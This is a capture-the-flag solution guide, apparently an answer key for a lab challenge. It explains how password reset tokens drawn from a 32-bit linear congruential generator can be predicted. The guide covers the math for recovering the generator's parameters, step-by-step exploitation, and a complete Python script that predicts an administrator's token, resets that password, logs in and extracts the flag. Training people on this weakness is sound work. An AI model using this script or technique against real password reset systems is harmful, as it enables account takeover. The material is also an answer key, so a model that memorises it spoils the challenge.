# A07 Hard: Solution Guide

### Vulnerability Analysis
The platform issues password recovery tokens formatted as 8-character hexadecimal strings generated by a 32-bit Linear Congruential Generator (LCG):
$$X_{n+1} = (A \cdot X_n + C) \pmod{2^{32}}$$

Because each 8-hex-digit token represents the exact 32-bit internal state of the generator ($X_n = \text{int}(\text{token}, 16)$), observing sequential outputs allows direct recovery of the generator's internal parameters without any source code knowledge.

### Mathematical Parameter Recovery
Given consecutive states $s_0, s_1, s_2$:
$$\Delta_0 = (s_1 - s_0) \pmod{2^{32}}$$
$$\Delta_1 = (s_2 - s_1) \pmod{2^{32}}$$

Because $\Delta_1 \equiv A \cdot \Delta_0 \pmod{2^{32}}$, if $\Delta_0$ is odd (meaning $\gcd(\Delta_0, 2^{32}) = 1$), the modular inverse $\Delta_0^{-1} \pmod{2^{32}}$ exists:
$$A \equiv \Delta_1 \cdot (\Delta_0)^{-1} \pmod{2^{32}}$$
$$C \equiv (s_1 - A \cdot s_0) \pmod{2^{32}}$$

Once $A$ and $C$ are recovered, any subsequent token can be predicted exactly from the preceding state.

### Exploitation Steps
1. Request 4 sequential password recovery tokens for `researcher_demo@apexbiologistics.net` via `POST /forgot-password`.
2. Inspect `GET /outbox` to extract the issued tokens and convert each to 32-bit integers.
3. Solve for $A$ and $C$ modulo $2^{32}$ using the consecutive differences.
4. Request a password recovery token for `admin@apexbiologistics.net`.
5. Predict the administrator's token:
   $$T_{admin} = (A \cdot X_{last} + C) \pmod{2^{32}}$$
6. Submit `POST /reset-password` with `email=admin@apexbiologistics.net`, `token=T_{admin}`, and `new_password=Pwned2026!`.
7. Sign in at `POST /login` with `admin@apexbiologistics.net` and `Pwned2026!`.
8. Access `/admin/governance` to retrieve the dynamic flag.

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6021"
s = requests.Session()
M = 2**32

# 1. Collect sequential tokens from outbox
print("[*] Requesting sample recovery tokens for researcher account...")
for _ in range(4):
    s.post(f"{BASE_URL}/forgot-password", data={"email": "researcher_demo@apexbiologistics.net"})

outbox_html = s.get(f"{BASE_URL}/outbox").text
hex_tokens = re.findall(r'<code style="color: var\(--teal\); font-weight: 700;">([0-9a-f]{8})</code>', outbox_html)
assert len(hex_tokens) >= 3, "Insufficient tokens collected"

states = [int(tok, 16) for tok in hex_tokens]

# 2. Mathematically recover LCG parameters A and C
A = None
C = None
for i in range(len(states) - 2):
    s0, s1, s2 = states[i], states[i+1], states[i+2]
    d0 = (s1 - s0) % M
    d1 = (s2 - s1) % M
    if d0 % 2 != 0: # Odd difference has modular inverse mod 2^32
        A = (d1 * pow(d0, -1, M)) % M
        C = (s1 - A * s0) % M
        break

assert A is not None and C is not None, "Failed to recover LCG parameters"
print(f"[+] Recovered LCG Multiplier A: {A}")
print(f"[+] Recovered LCG Increment C:  {C}")

# 3. Request reset token for admin
last_state = states[-1]
s.post(f"{BASE_URL}/forgot-password", data={"email": "admin@apexbiologistics.net"})

# 4. Predict admin token
admin_state = (A * last_state + C) % M
admin_token = f"{admin_state:08x}"
print(f"[+] Predicted admin token: {admin_token}")

# 5. Reset admin password
new_pwd = "PwnedAdmin2026!"
reset_resp = s.post(f"{BASE_URL}/reset-password", data={
    "email": "admin@apexbiologistics.net",
    "token": admin_token,
    "new_password": new_pwd
})
assert reset_resp.status_code == 200, f"Reset failed: {reset_resp.text}"

# 6. Authenticate as Chief Medical Director
login_resp = s.post(f"{BASE_URL}/login", data={
    "email": "admin@apexbiologistics.net",
    "password": new_pwd
})
assert login_resp.status_code == 200 or login_resp.history

# 7. Extract flag from Governance Vault
gov_resp = s.get(f"{BASE_URL}/admin/governance")
flag = re.search(r"RTSA\{[^}]+\}", gov_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
